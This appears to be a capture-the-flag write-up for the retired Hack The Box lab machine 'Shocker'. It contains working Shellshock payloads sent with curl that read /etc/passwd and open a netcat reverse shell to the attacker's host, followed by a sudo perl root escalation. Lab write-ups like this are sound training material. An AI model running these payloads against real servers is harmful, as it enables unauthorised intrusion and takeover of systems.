---
layout: default
title : muzec - Shocker Writeup
---

![image](https://user-images.githubusercontent.com/69868171/124268074-0d572100-db07-11eb-9ce1-7f4bf48fb359.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.56]
└─$ cat nmap.nmap               
# Nmap 7.91 scan initiated Fri Jul  2 03:15:53 2021 as: nmap -sC -sV -oA nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.45s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1310/tcp filtered husky
2222/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 03:17:29 2021 -- 1 IP address (1 host up) scanned in 95.67 seconds
```

We are having two open ports nice seems we are checking HTTP port first to see what we have running.

![image](https://user-images.githubusercontent.com/69868171/124268074-0d572100-db07-11eb-9ce1-7f4bf48fb359.png)

`Don't Bug Me!` really let check the source code if we have anything.

![image](https://user-images.githubusercontent.com/69868171/124268955-40e67b00-db08-11eb-9888-9c4b01668445.png)

Nothing also time to burst some directory.

![image](https://user-images.githubusercontent.com/69868171/124269078-696e7500-db08-11eb-9228-5976f0db735a.png)

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB]                                                                                                                           
└─$ gobuster dir -u 10.10.10.56/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh,pl,cgi
===============================================================
Gobuster v3.1.0                                                                    
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/       
[+] Method:                  GET
[+] Threads:                 10                                                    
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,pl,cgi,txt,php,html,bak
[+] Timeout:                 10s
===============================================================
2021/07/02 04:26:23 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
Progress: 7472 / 1764488 (0.42%)              [ERROR] 2021/07/02 04:32:38 [!] Get "http://10.10.10.56/cgi-bin/149.cgi": context deadline exceeded (Client.Timeout excee
ded while awaiting headers)
[ERROR] 2021/07/02 04:32:38 [!] Get "http://10.10.10.56/cgi-bin/asia.sh": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
```

Seems like a shellshock let confirm it.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.56]
└─$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

Seems we are right let try to get a reverse shell.

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.61 1337 >/tmp/f'" http://10.10.10.56/cgi-bin/user.sh`

![image](https://user-images.githubusercontent.com/69868171/124270422-2f05d780-db0a-11eb-9102-cb6af2538179.png)

We have shell let spawn a TTY shell with `python3 -c 'import pty; pty.spawn ("/bin/bash")'` and we should be good to go now.

![image](https://user-images.githubusercontent.com/69868171/124270787-a50a3e80-db0a-11eb-9f14-8aa49344d90c.png)

Going to the home directory and we have user.txt let get root now.

### Privilege Escalation

Always check `sudo -l` .

![image](https://user-images.githubusercontent.com/69868171/124271262-3e395500-db0b-11eb-9d80-934b16aa8831.png)

Time to check `gtfobins` searching and we have the command.

![image](https://user-images.githubusercontent.com/69868171/124271507-89536800-db0b-11eb-84ef-fd571a196889.png)

Now let try it `sudo perl -e 'exec "/bin/sh";'` and we are root

![image](https://user-images.githubusercontent.com/69868171/124271685-c0297e00-db0b-11eb-9140-6677f84608f5.png)

We are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
